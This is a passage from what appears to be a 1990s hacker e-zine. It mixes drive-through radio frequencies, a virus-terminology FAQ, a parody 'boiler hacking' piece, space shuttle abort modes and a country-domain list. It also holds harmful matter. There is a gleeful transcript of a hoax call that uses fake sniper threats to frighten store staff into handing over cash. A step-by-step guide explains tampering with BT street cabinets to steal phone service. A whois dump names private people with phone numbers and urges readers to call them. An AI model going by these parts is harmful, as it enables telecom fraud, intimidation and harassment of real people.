                            457.5875       467.8125      Vienna, VA area
                            457.6000       467.8250      UNKNOWN OH area
                            460.8875       465.8875      Washington, DC area
                            462.7625       467.8875      Washington, DC area

McDonald's CANADA            30.8400       151.6700      main freq. Canada
                             30.8400       154.1450      aux. freq. Canada

McDonald's U.S.A.            30.8400       154.5700      San Diego, CA area
                             31.0000       170.3050      UNKNOWN OH/NC area
                             33.1400       151.8950      Nationwide
                             33.1400       170.3050      Southfield, MI area
                             33.4000       154.5400      Frederick, MD
                             33.4000       154.5700      UNKNOWN area **
                             35.0200       151.8950      UNKNOWN area **
                             35.0200       154.4900      Decatur, IN area
                             35.0200       154.6000      Nationwide
                            151.7150       169.4450      Washington, DC area
                            151.7450       UNKNOWN       UNKNOWN OH area
                            151.7750       171.9050      UNKNOWN OH area
                            154.5700       170.2450      Nationwide
                            154.6000       171.1050      Nationwide
                            155.0000       UNKNOWN       UNKNOWN OH area
                            457.5375       461.0875      UNKNOWN OH area
                            457.5500       467.7750      UNKNOWN OH area
                            457.6000       467.8250      UNKNOWN OH area
                            460.8875       465.8875      UNKNOWN OH area
                            461.0375       466.0375      UNKNOWN OK/CA area
                            461.0875       466.0875      UNKNOWN OH area
                            462.1625       467.1625      UNKNOWN OH area
                            463.2875       468.2875      UNKNOWN NY area
                            464.5125       UNKNOWN       UNKNOWN OH area
                            469.0125       464.0125      Germantown, MD
                            469.1875       464.1875      Frederick, MD
                            920.5000 WFM   903.5000 WFM  Gaithersburg, MD

Rally's                     457.5375       468.3875      UNKNOWN OH area
                            461.0875       466.0875      UNKNOWN OH area
                            461.5375       462.1625      Holland OH area

Roy Rogers                   30.8400       154.5700      Germantown, MD
                            457.5375       467.7625      Washington, DC area
                            469.0125       464.0125      Germantown, MD
                            469.9250       464.9250      Vienna, VA

Taco Bell                    30.8400       154.5700      Washington, DC area
                             33.1600       154.5150      Frederick, MD  
                             33.4000       154.5400      Germantown, MD  
                            460.8875       465.8875      Nationwide
                            461.0875       466.0875      UNKNOWN OH area
                            461.5375       UNKNOWN       UNKNOWN OH area
                            464.9625       469.9625      UNKNOWN OH area
                            469.0125       464.0125      Reston, VA

Wendy's                      33.4000       154.5400      Rockville, MD
                             49.8300        49.8900      UNKNOWN area **
                            457.5125       467.7375      UNKNOWN OH area
                            457.5375       467.7625      UNKNOWN OH area
                            457.6125       467.8375      Washington, DC area
                            460.8875       465.8875      Nationwide
                            461.0875       466.0875      UNKNOWN OH area
                            461.8125       UNKNOWN       UNKNOWN OH area
                            464.3750       UNKNOWN       Headquarters
                            464.5125       UNKNOWN       Columbus, OH area

White Castle                457.6000       467.8250      UNKNOWN OH area
                            461.8125       UNKNOWN       Columbus, OH area

- Have Phun!

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  2. Robbing Stores With Phones, A Real Example : The CrackHouse
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

       the following is a transcript of a teleconference robbery of a 
   Wawa convience store, all names remain the same to fully implicate the 
            guilty. the sad thing is this is an actual transcript.


 dk: Hello, listen very carefully I'm not going to repeat myself.
 manager: Who is this? 
 dk: Don't worry about that, listen carefully, don't interrupt. 
 Are you the manager and if so what is your name? 
 manager: yes, i'm the manager, my names kathy. 
 dk:ok kathy, look across the street do you see the apartment complex 
 directly opposite you? 
 manager: yes. 
 dk: i have a man stationed in a car in that complex's parking lot.
 he has a high powerd assault rifle aimed at the individual behind the
 counter. i have another man stationed adjacent to the Wawa with a cellular 
 phone. what's the individual's name behind the cash register? 
 manager: her names Lori, please don't hurt anyone. 
 dk: no ones going to get hurt as long as you shut the fuck up and do
 exactly as i say. instruct lori that she is to keep her hands on the
 counter at all times, with her palms laid out flat. shes only to move
 when she must make change for a customer, do not alert any customers in 
 the store kathy. do you understand me? 
 manager: yes i understand, hold on. (kathy then instructs lori) 
 please promise you won't hurt anyone? please. 
 dk: no ones getting hurt, now we got 30 seconds kathy from when 
 i say go, when i say go you grab a plastic bag, fill it with all the money 
 in the register furthest from the doorway and open the back door and 
 leave all the money there, then shut and lock the door. 
 manager: ok ok, do you want the foodstamps? 
 dk: no! the foodstamps go in a seperate bag. 
 sulfur: and get me a gatorade. 
 manager: a gatorade? what kind? 
 sulfur: if it's not a large im gonna open fire. 
 manager: ok just please don't hurt anyone. 
 dk: ok kathy, go! (theres a rustling of bags and some background noise) 
 manager: ok, done, now what? 
 dk: kathy have you made any attempt to contact any form of law 
 enforcement? 
 manager: no i promise. 
 sulfur: she's lying. 
 dk: kathy, do you know what a digital voice analyzer is? (dk is 
 now completely talking out his ass) 
 manager: no. 
 dk: well we have one connected to a polygraph examiner and its 
 telling us your lying kathy. 
 manager: i swear to you im not lying! 
 sulfur: shoot her 
 dk: kathy your lying. 
 manager: no no im not! 
 dk: your lying kathy, mike, open fire open fire! 
 z: open fire!! 
 manager: LORI!! DUCK!! 
 *click* 
 everyone on the conference call: BAHAHAHAHAHAHAHAHAHA 


ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  3. How To Rewire Your House For Free Phone Calls : WildFire
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
               
               (-)(-)(-)(-)(-)(-)(-)(-)(-)(-)(-)(-)(-)(-)(-)(-)(-)

                    How To Rewire You House For Free Fone Calls
                                   In The U.K

               (-)(-)(-)(-)(-)(-)(-)(-)(-)(-)(-)(-)(-)(-)(-)(-)(-)

                                           By WildFire of AWOL

The aim is to teach you how to rewire your house to an engineer test line
for free Fone calls, you dont need any little coloured boxes etc, all you
need is a bit of patience and a lot of guts =)

EQUIPMENT -:

A B.T line into your house
Socket wrench with 1/2 inch bit
Offical looking enginner clothing (lumi jacket)
C.B radios (Optional) 

STEP 1:  

We need to find out some information about the your line
(Note : these numbers are not anything to do with your Fone number)
what we need to know is how it runs back to B.T

Eg. The pole outside your house is the first contact then it runs
    underground to A big green box, these are called DP's
    (Disconection/Connection points)


Fig 1.

House -----> Pole   ------> Green box   ------>   B.T 
              \/              \/
Prefix =      46              95

The way to find this out is by sabotaging your house's fone line to get an
engininer to pay you a visit . With him he should bring a nice filo-fax with
all his jobs in (all the places he's got to visit and their line info etc.)

You now Have 3 options

          (i)   KILL HIM!! and steal all his neat stuff *

         (ii)   Act Intrested in his work and ask how he knows which line
                is yours say you want to do work experience in B.T etc/etc
                and he might show it to you and even explain it to you.

        (iii)   Sabotage your line in such a way he's got to go up your
                pole , while he's trying to work out what the fuck you've done
                have a look at the filo-fax and write down all your info.

           * Not Recommended 

There are probally other ways to get your info ie. Bullshiting the B.T depot.
or operators but they are not known my me , if anyone has any ideas i'd like
to hear from them...

STEP 2 :  Decode

When you have the filo-fax in your hands flick through it, near the end should
be a page with your surname and telephone number..

      below this should be the following ..........


           PCP     E     P     DP     PR 

            15     15   360   1922    4

What we are concerned with are the DP, PCP and P

DP    -- This is the pole, you can check this by going outside and looking
         at it .

PCP/E -- This is the big green box have a look around your neighbourhood
         not to be confused with cable green boxes !!.

P     -- This is where your wire-pair are in the green box.

The other letters are probally what contact your wire-pair is on the pole etc.

Now You're Set To Go On An Adventure ..

Wait until darkness falls , Put on your funky glow in the dark jackets,
put the socket wrench in your pocket and take a visit to your local greener.

Look around for nosey OAP's or other paranoid people.  I actually had the
shit kicked out of me by a large bloke who thought I was breaking into
his house because I was looking very suspect walking around the streets
stopping at the end of his road near the green box, ouch!

On the front of the box there should be 2 diamond shaped things, pull out the
wrench and undo them , the box should now open with ease..
You Should see loads of wires going all over the place.  On the back of the
left door there should be a white box (like you the one you plug your fone
into back home) this is what the Enginerer uses for calls this is what we are
going to swap with your house pair .

How To Find Your Pair: There should be transparent plastic struts going from
top to bottom, they have holes (where the wires come through) with very
tiny numbers near them.

The Struts are divided up into hundreds , So if your "P" was 360 you go along
to the third strut and down until you find the tiny number 60 next to a hole.
(see fig 1.18291739)In this hole should be some wire's, with luck they should
be yours.  Pull the wires out of the white-box and reconnect it to the wire
pair going to your house. (the use of radios for checking might be a good
idea)

Fig 1.18291739               

  100-200   200-300  300-400  400-500  500-600  600-700  700-800 800-900
    Ý        Ý        Ý        Ý        Ý        Ý        Ý        Ý      
    Ý        Ý        Ý        Ý        Ý        Ý        Ý        Ý   
    Ý        Ý        Ý        Ý        Ý        Ý        Ý        Ý   
    Ý        Ý        Ý        Ý        Ý        Ý        Ý        Ý   
    Ý        Ý        Ý        Ý        Ý        Ý        Ý        Ý   
    Ý        Ý        Ý        Ý        Ý        Ý        Ý        Ý   
    Ý        Ý        Ý        Ý        Ý        Ý        Ý        Ý      
    Ý        Ý        Ý        Ý        Ý        Ý        Ý        Ý   
    Ý        Ý        Ý-360    Ý        Ý        Ý        Ý        Ý   
    Ý        Ý        Ý        Ý        Ý        Ý        Ý        Ý   
    Ý        Ý        Ý        Ý        Ý        Ý        Ý        Ý   
    Ý        Ý        Ý        Ý        Ý        Ý        Ý        Ý   


Go Home And See if You Have A Dial Tone .

Congratulations....
Your house is now ready for free calls ..
Dial 175 and get your new fone Number

Your old line will be in limbo so you might as well stop paying line rental,
so tell B.T to disconnect it. 

   Notes for use: If You're Leaving the dodgy line permanent then make
                  sure you hide the wires well..
                  If you are going to get your old line cut-off then make
                  sure all your wiring is back as it was before.
                  Don't tell Stupid People your number.
                  Don't call Operators etc.

When we used this method we only connected the dodgy line when we needed it,
so I don't know what will happen if left on a permenent basis ???!"*

The information in this file came from alot of Trial & Error so some facts
may be incorrect.. (Anyway it worked for us!).

 <You didnt learn this from me , and I didnt just tell you that ?Confused?>

                    -----------  WildFire -----------
                    -----------  AWOL '97 -----------

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
===============================================================================
==[ MISC ]=====================[ .SECTION D. ]=======================[ MISC ]==
===============================================================================
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  1. Hacking Electrical Items Part 2, The Sequel : Tetsu Khan
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

LAst TiME wE WuZ Hax0Rin' ToAsTAz, So foR Dis TiMe i BeeN ThINkin On WhUT wE
ShOUld hAx0R, aNd I ThOUghT, "eYe WiLL WrItE AbOuT....BOiLAhS!!! YeS, ThOsE
boILaHs yEw FiNd In yOuR BaSEmEnt!!" AnD So I StArTed To pLaY ArouND WifF Muh
BoiLAh AT h0me, NoW Yew caN REwt YoUr BoILah Tew!!!

FiNDiNg OuT dA OS ThaT ThA BoiLaH iZ RuNNiN'
--------------------------------------------

  yEw Can DeW ThIS 3 WayZ...

  1: LeWk FoR a StIcKA On It DaT Sez.
  2: FiNd A CoNsOle On DA BoiLAh, ThEn, If IT hAs A kEYbOArd (DepEndZ oN
     MaNuFAcTuReR) tYpE "uname -a" AnD It WiLL Tell YeW!
  3: FiNd Da ManUaL FoR YouR BOilaH (easiest way)

WhEn YoU KnOw YoUr BoILaHs oPeRATinG SyStEm, yEw cAN PRocEEd To Hax0R It...
---------------------------------------------------------------------------

  Hax0RinG a BoILaH KaN BeE VeRy DangERous, LiKE Hax0Rin' A nuKelear PoWaHH
  sTAtIon, So MaKe sHuRe YeW dO ThE fOLLowiNG...

  1: PuT oN PrOtECtivE CloThInG, LikE GloVeS, AnD a hAT, aNd MaYBe a sCarF,
     tHis Is BeCoS BaSEmEnts CaN bE CooOLD, aNd YEw WouLDnt WanT To CaTch A
     ChiLL wOULd YeW?
  2: MaKE ShURe YeW HaVE A SpAnnEr Or WreNCH, As YoU WiLL NeEd ThEsE tO FiNd
     hIdDEn pOrTz AnD TeW Eye-PeE SpoOF fRom TruSteD HoStS (liKe a SinK, oR
     A pIpE, Or A WaSHing MaChInE)

  LiKE WiV ToAsTeRz, We wILL fiRsT nEeD tO FiNd HiDDeN PoRtS, So wE NeEd To
  ScAn FoR tHem, bOilAhz ArE BiGGer tHan tOASterz, sO ThiS MaY tAke SoMe TiMe.
  YeW cAn LeWk FoR SucH HiDDen PoRtS bY dOIng ThEsE tHinGs...

  1: LeWKiNg ArOunD ThE BoILaH wIV yOUR EyeS.
  2: TrAcInG PiPeS aLL ArOuND yOuR hOuSe (bit like traceroute programs do)
  3: UsInG StEalTh TEkNiquEs By HidInG ArOuND yOuR hOuSE AnD LIsTENinG fOr
     WaTeR, liKE FrOm TaPs aNd StUFf...

  If YoU dOnT FiNd AnY HIdDen PoRtS, ThEN YeW cAN JuST LoGiN FrOM a WaSHiNG
  MaChIne, Or OtHeR tRUstEd HoSt On ThE NeTwOrK, wHeN yOu COnnEcT tO tHa
  BoiLaH FRoM tHe WasHiNg MaChINe YeW wiLL sEe sOmeThInG LiKe ThIs...

 +-------------------+
 | GEneRaL eLeKTrIk  |
 | M:0225            |
 | S:b4588           |
 | T:02              |
 +-------------------+

 BoiLaH OS RelEasE 2.54 (bIg BaAAadAss BoILaH)

 login: BoiLaH
 password:      <--- We AttEmPtid ThE DeFauLt "BoiLaH"

     ------------------------------------------------------------
                         L0ghINn GRaNTiD
                         ***************  
     ------------------------------------------------------------

                        WeLKoMe To bOiLAh
  
                             [BOPR]
                     
                 bOiLiNg OpErAtIoNS PlaN rEsPonSe
                   
     ------------------------------------------------------------

login on tty[wAShInG mAcHiNE]
last login from BaTHrEwm.COM on tty[ShOwEr] at 7:43p.m.

1: sHuTDoWn
2: CoLd WaTeR
3: hOt wAtEr
4: UNiX TyPE SheLL ENViRONMEnT

  If YeW GhET THiS YEW ArE COOL)(#*$  Ok NoW CHEwZe NuMbAhh 4, ThEn YeWsE
  ThIS uniVeRSaL BoiLAhh ExPLoiT...

% fuck yew eye am eleet and k-r4d 'cos muh name iz ZeroCool!
fuck : command not found
% whoami
root
%

tHe bEst tImEs To ReWT BoILaHs Is lAtE aT nIgHt WhEn No-OnE Is LOggEd-In, CoS
In ThA dAY, yEw GEt uSeRs LoGgEd iN To DoWLoAd WatEr AnD ShIt.

eYe WiLL KoNItuE wItH oTheR ExAMplEs NeXt TiMe!

T_K

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  2. Virus Definitions : so1o
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

This is for all you lame fucks out there who say I infect your systems with
viruses, even when the only malicious shit I code are Windoze killers, anyway
here are a few definitions, just so you know what you're on about next time =)

What are computer viruses (and why should I worry about them)?
--------------------------------------------------------------

   According to Fred Cohen's well-known definition, a COMPUTER VIRUS is a
   computer program that can infect other computer programs by modifying
   them in such a way as to include a (possibly evolved) copy of itself.
   Note that a program does not have to perform outright damage (such as
   deleting or corrupting files) in order to to be called a "virus".
   However, Cohen uses the terms within his definition (e.g. "program"
   and "modify") a bit differently from the way most anti-virus
   researchers use them, and classifies as viruses some things which most
   of us would not consider viruses.

   Many people use the term loosely to cover any sort of program that
   tries to hide its (malicious) function and tries to spread onto as
   many computers as possible.  (See the definition of "Trojan".)  Be
   aware that what constitutes a "program" for a virus to infect may
   include a lot more than is at first obvious - don't assume too much
   about what a virus can or can't do!

   These software "pranks" are very serious; they are spreading faster
   than they are being stopped, and even the least harmful of viruses
   could be fatal.  For example, a virus that stops your computer and
   displays a message, in the context of a hospital life-support
   computer, could be fatal.  Even those who created the viruses could
   not stop them if they wanted to; it requires a concerted effort from
   computer users to be "virus-aware", rather than the ignorance and
   ambivalence that have allowed them to grow to such a problem.

What is a Trojan Horse?
-----------------------

   A TROJAN HORSE is a program that does something undocumented which the
   programmer intended, but that the user would not approve of if he knew
   about it.  According to some people, a virus is a particular case of a
   Trojan Horse, namely one which is able to spread to other programs
   (i.e., it turns them into Trojans too).  According to others, a virus
   that does not do any deliberate damage (other than merely replicating)
   is not a Trojan.  Finally, despite the definitions, many people use
   the term "Trojan" to refer only to a *non-replicating* malicious
   program, so that the set of Trojans and the set of viruses are
   disjoint.

What are the main types of PC viruses?
--------------------------------------

   Generally, there are two main classes of viruses.  The first class
   consists of the FILE INFECTORS which attach themselves to ordinary
   program files.  These usually infect arbitrary .COM and/or .EXE
   programs, though some can infect any program for which execution is
   requested, such as .SYS, .OVL, .PRG, & .MNU files.
   
   File infectors can be either DIRECT ACTION or RESIDENT.  A direct-
   action virus selects one or more other programs to infect each time
   the program which contains it is executed.  A resident virus hides
   itself somewhere in memory the first time an infected program is
   executed, and thereafter infects other programs when *they* are
   executed (as in the case of the Jerusalem) or when certain other
   conditions are fulfilled.  The Vienna is an example of a direct-action
   virus.  Most other viruses are resident.

   The second category is SYSTEM or BOOT-RECORD INFECTORS: those viruses
   which infect executable code found in certain system areas on a disk
   which are not ordinary files.   On DOS systems, there are ordinary
   boot-sector viruses, which infect only the DOS boot sector, and MBR
   viruses which infect the Master Boot Record on fixed disks and the DOS
   boot sector on diskettes.  Examples include Brain, Stoned, Empire,
   Azusa, and Michelangelo.  Such viruses are always resident viruses.

   Finally, a few viruses are able to infect both (the Tequila virus is
   one example).  These are often called "MULTI-PARTITE" viruses, though
   there has been criticism of this name; another name is "BOOT-AND-FILE"
   virus.

   FILE SYSTEM or CLUSTER viruses (e.g. Dir-II) are those which modify
   directory table entries so that the virus is loaded and executed
   before the desired program is.  Note that the program itself is not
   physically altered, only the directory entry is.  Some consider these
   infectors to be a third category of viruses, while others consider
   them to be a sub-category of the file infectors.

What is a stealth virus?
------------------------

   A STEALTH virus is one which hides the modifications it has made in
   the file or boot record, usually by monitoring the system functions
   used by programs to read files or physical blocks from storage media,
   and forging the results of such system functions so that programs
   which try to read these areas see the original uninfected form of the
   file instead of the actual infected form. Thus the viral modifications
   go undetected by anti-viral programs.  However, in order to do this,
   the virus must be resident in memory when the anti-viral program is
   executed.

   Example: The very first DOS virus, Brain, a boot-sector infector,
            monitors physical disk I/O and re-directs any attempt to read a
            Brain-infected boot sector to the disk area where the original boot
            sector is stored.  The next viruses to use this technique were the
            file infectors Number of the Beast and Frodo (= 4096 = 4K).
          
   Countermeasures: A "clean" system is needed so that no virus is
   present to distort the results.  Thus the system should be built from
   a trusted, clean master copy before any virus-checking is attempted;
   this is "The Golden Rule of the Trade."  With DOS, (1) boot from
   original DOS diskettes (i.e. DOS Startup/Program diskettes from a
   major vendor that have been write-protected since their creation);

   (2) use only tools from original diskettes until virus-checking has
       completed.

What is a polymorphic virus?
----------------------------

   A POLYMORPHIC virus is one which produces varied (yet fully
   operational) copies of itself, in the hope that virus scanners
   will not be able to detect all instances of the virus.

   One method to evade signature-driven virus scanners is self-encryption
   with a variable key; however these viruses (e.g. Cascade) are not
   termed "polymorphic," as their decryption code is always the same and
   thus can be used as a virus signature even by the simplest, signature-
   driven virus scanners (unless another virus or program uses the
   identical decryption routine).

   One method to make a polymorphic virus is to choose among a variety of
   different encryption schemes requiring different decryption routines:
   only one of these routines would be plainly visible in any instance of
   the virus (e.g. the Whale virus).  A signature-driven virus scanner
   would have to exploit several signatures (one for each possible
   encryption method) to reliably identify a virus of this kind.

   A more sophisticated polymorphic virus (e.g. V2P6) will vary the
   sequence of instructions in its copies by interspersing it with
   "noise" instructions (e.g. a No Operation instruction, or an
   instruction to load a currently unused register with an arbitrary
   value), by interchanging mutually independent instructions, or even by
   using various instruction sequences with identical net effects (e.g.
   Subtract A from A, and Move 0 to A).  A simple-minded, signature-based
   virus scanner would not be able to reliably identify this sort of
   virus; rather, a sophisticated "scanning engine" has to be constructed
   after thorough research into the particular virus.

   The most sophisticated form of polymorphism discovered so far is the
   MtE "Mutation Engine" written by the Bulgarian virus writer who calls
   himself the "Dark Avenger".  It comes in the form of an object module.
   Any virus can be made polymorphic by adding certain calls to the
   assembler source code and linking to the mutation-engine and
   random-number-generator modules.

   The advent of polymorphic viruses has rendered virus-scanning an ever
   more difficult and expensive endeavor; adding more and more search
   strings to simple scanners will not adequately deal with these
   viruses.

What is a companion virus?
--------------------------

   A COMPANION virus is one which, instead of modifying an existing file,
   creates a new program which (unknown to the user) gets executed by the
   command-line interpreter instead of the intended program.  (On exit,
   the new program executes the original program so that things will
   appear normal.)  The only way this has been done so far is by creating
   an infected .COM file with the same name as an existing .EXE file.
   Note that those integrity checkers which look only for *modifications*
   in *existing* files will fail to detect such viruses.

   (Note that not all researchers consider this type of malicious code
   to be a virus, since it does not modify existing files.)

Miscellaneous Jargon and Abbreviations
--------------------------------------

   BSI = Boot Sector Infector: a virus which takes control when the
         computer attempts to boot (as opposed to a file infector).

  CMOS = Complementary Metal Oxide Semiconductor: A memory area that is
         used in AT and higher class PCs for storage of system information.
         CMOS is battery backed RAM (see below), originally used to maintain
         date and time information while the PC was turned off.  CMOS memory
         is not in the normal CPU address space and cannot be executed. While
         a virus may place data in the CMOS or may corrupt it, a virus cannot
         hide there.

   DOS = Disk Operating System.  We use the term "DOS" to mean any of the
         MS-DOS, PC-DOS, or DR DOS systems for PCs and compatibles, even
         though there are operating systems called "DOS" on other (unrelated)
         machines.

   MBR = Master Boot Record: the first Absolute sector (track 0, head 0,
         sector 1) on a PC hard disk, that usually contains the partition table
         (but on some PCs may simply contain a boot sector).  This is not the
         same as the first DOS sector (Logical sector 0).

   RAM = Random Access Memory: the place programs are loaded into in
         order to execute; the significance for viruses is that, to be active,
         they must grab some of this for themselves.  However, some virus
         scanners may declare that a virus is active simply when it is found
         in RAM, even though it might be simply left over in a buffer area of
         RAM rather than truly being active.

   TOM = Top Of Memory: the end of conventional memory, an architectural
         design limit at the 640K mark on most PCs.  Some early PCs may not
         be fully populated, but the amount of memory is always a multiple of
         64K.  A boot-record virus on a PC typically resides just below this
         mark and changes the value which will be reported for the TOM to the
         location of the beginning of the virus so that it won't get
         overwritten.  Checking this value for changes can help detect a
         virus, but there are also legitimate reasons why it may change.
         A very few PCs with unusual memory managers/settings may
         report in excess of 640K.

   TSR = Terminate but Stay Resident: these are PC programs that stay in
         memory while you continue to use the computer for other purposes;
         they include pop-up utilities, network software, and the great
         majority of viruses.  These can often be seen using utilities such as
         MEM, MAPMEM, PMAP, F-MMAP and INFOPLUS.

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  3. Fun With whois, sinnerz.com : so1o
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

Lewk WhuT eyE FoUnd...

phish:~> whois sinerz.com
[rs.internic.net]
SIN (SINNERZ3-DOM)
   130 105th Ave. S.E. Apt. 218
   Bellevue, Wa 98004
   USA

   Domain Name: SINNERZ.COM

   Administrative Contact:
      Kimminau, Suzette  (SK2455)  evilchic@NWLINK.COM
      (206)454-7176
   Technical Contact, Zone Contact:
      Schmittel, Blair  (BS469)  blair@CYBER-NAUT.COM
      (801)654-3139

   Record last updated on 26-Mar-97.
   Record created on 26-Mar-97.

   Domain servers in listed order:

   STRECH.CYBER-NAUT.COM	192.41.77.5
   ITIS.EASILINK.COM		192.41.78.2


The InterNIC Registration Services Host contains ONLY Internet Information
(Networks, ASN's, Domains, and POC's).
Please use the whois server at nic.ddn.mil for MILNET Information.

phish:~> fwhois sinnerz.com@nic.ddn.mil
[nic.ddn.mil]
No match for "SINNERZ.COM".

Please be advised that this whois server only contains DOD Information.
All INTERNET Domain, IP Network Number, and ASN records are kept in
the Internet Registry, RS.INTERNIC.NET.

-------------------------------------------------------------------------------

  =--> S.I.N : [S] cared sh [I] tless lame fucks not-so-a [N] onymous. <--=

-------------------------------------------------------------------------------
If sIn play this down as fake, why not phone up Evil Chic and ask if Suzey is
there? You will soon find out the truth =) Expect details of all sIn members
soon.

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  4. Hacking Space Shuttles, Abort Codes : NailGun
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

Okay, if you ever decide to hack a space shuttle (*.arc.nasa.gov is hacked very
frequently) and you actually plan it all out, make sure you collect all the
parts of this "mini-guide" of little things that are important and you will need
to know, this section concerns....

SPACE SHUTTLE ABORT MODES
-------------------------

     Space Shuttle launch abort philosophy aims toward safe and intact
     recovery of the flight crew, orbiter and its payload.

Abort modes include:

     *  Abort-To-Orbit (ATO) -- Partial loss of main engine thrust late enough
        to permit reaching a minimal 105-nautical mile orbit with orbital
        maneuvering system engines.

     *  Abort-Once-Around (AOA) -- Earlier main engine shutdown with the
        capability to allow one orbit around before landing at Edwards Air
        Force Base, Calif.; White Sands Space Harbor (Northrup Strip), N.M.;
        or the Shuttle Landing Facility (SLF) at Kennedy Space Center, Fla..

     *  Trans-Atlantic Abort Landing (TAL) -- Loss of two main engines midway
        through powered flight would force a landing at Banjul, The Gambia;
        Ben Guerir, Morocco; or Moron, Spain.

     *  Return-To-Launch-Site (RTLS) -- Early shutdown of one or more engines
        and without enough energy to reach Banjul would result in a pitch
        around and thrust back toward KSC until within gliding distance of the
        SLF.

     STS-35 contingency landing sites are Edwards AFB, White Sands,
     Kennedy Space Center, Banjul and Ben Guerir, Moron.

Next time we will probably look at the payloads of space shuttles, l8r.

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  5. Country Domain Listing : SirLance
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

Listing Of Domains By Country, like *.fr *.uk etc. etc.

AD - Andorra - Andorre
AE - Imarata al Arabiya al Muttahidah - Ittihad al Imirat alArabiya - United Arab Emirates
AF - Afghanistan - Afghanestan
AG - Antigua and Barbuda
AI - Anguilla
AL - Shqip&euml;ria - Albania
AM - Armenia - Hayastan
AN - Netherlands Antilles - Nederlandse Antillen
AO - Angola
AQ - Antarctica
AR - Argentina
AS - American Samoa
AT - Austria - Osterreich
AU - Australia
AW - Aruba
AZ - Azerbaijan - Azerbaycan
BA - Bosnia and Herzegovina - Bosna i Hercegovina
BB - Barbados
BD - Bangladesh
BE - Belgium - Belgique - Belgie
BF - Burkina
BG - Bulgaria
BH - Bahrain - Bahrayn
BI - Burundi
BJ - Benin
BM - Bermuda
BN - Brunei
BO - Bolivia
BR - Brazil - Brasil
BS - Bahamas
BT - Bhutan
BV - Bouvet Island - Bouvetoya
BW - Botswana
BY - Belarus - Byelarus'
BZ - Belize
CA - Canada
CC - Cocos (Keeling) Islands (Australia)
CF - Central Africa
CG - Congo
CH - Switzerland - Schweiz - Suisse - Svizzera - Svizra - Helvetia
